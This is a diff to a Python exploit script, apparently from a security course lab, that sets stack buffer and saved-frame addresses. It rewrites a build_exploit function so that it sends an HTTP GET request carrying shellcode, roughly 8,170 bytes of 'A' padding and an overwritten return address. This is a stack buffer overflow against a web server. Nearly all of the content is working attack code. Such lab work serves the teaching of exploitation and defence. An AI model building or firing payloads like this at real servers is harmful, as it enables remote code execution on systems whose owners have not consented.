@@ -17,8 +17,8 @@ import struct
 # which you can then use in build_exploit(); the following are just
 # examples.
 
-stack_buffer = 0x34567890
-stack_saved_ebp = 0x12345678
+stack_buffer = 0xbfffe6d8 
+stack_saved_ebp = 0xbfffeee8
 stack_retaddr = stack_saved_ebp + 4
 
 
@@ -40,12 +40,12 @@ def build_exploit(shellcode):
     # strings, not byte strings. You should take care to use the latter over
     # the former (e.g. b'hello world').
 
-
-    bigstuff = b''
-    for i in range(8170):
-        bigstuff += b's'
-
-    test = b'GET /?temp=' + bigstuff + b' HTTP/1.0\r\n'
+    hello = b'/'
+    hello += shellcode
+    for i in range(8170-len(shellcode)):
+        hello += b'A'
+    hello += b'\xbb\xbb\xbb\xbb' # Reverse order because of endianism
+    test = b'GET ' + hello + b' HTTP/1.0\r\n' + b'\r\n'
 
     return test
 
